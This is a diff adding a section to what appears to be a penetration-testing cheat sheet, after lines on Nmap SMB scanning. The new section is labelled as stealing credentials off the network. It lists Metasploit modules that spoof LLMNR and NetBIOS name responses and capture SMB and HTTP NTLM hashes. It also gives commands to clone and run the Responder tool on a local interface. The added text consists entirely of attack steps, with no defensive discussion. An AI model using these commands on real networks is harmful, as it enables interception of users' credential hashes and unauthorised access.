@@ -55,3 +55,17 @@ Nmap scans for vulnerable SMB Servers
 
 Nmap List all SMB scripts installed
      # ls -l /usr/share/nmap/scripts/smb\*
+     
+--------------- LLMNR / NBT-NS Spoofing - Steal credentials off the network. ---------------
+Spoof / poison LLMNR / NetBIOS requests:
+     # auxiliary/spoof/llmnr/llmnr_response
+     # auxiliary/spoof/nbns/nbns_response
+
+Capture the hashes:
+     # auxiliary/server/capture/smb
+     # auxiliary/server/capture/http_ntlm
+
+Using Responder to Steal Creds
+     # git clone https://github.com/SpiderLabs/Responder.git 
+     # python Responder.py -i local-ip -I eth0
+     
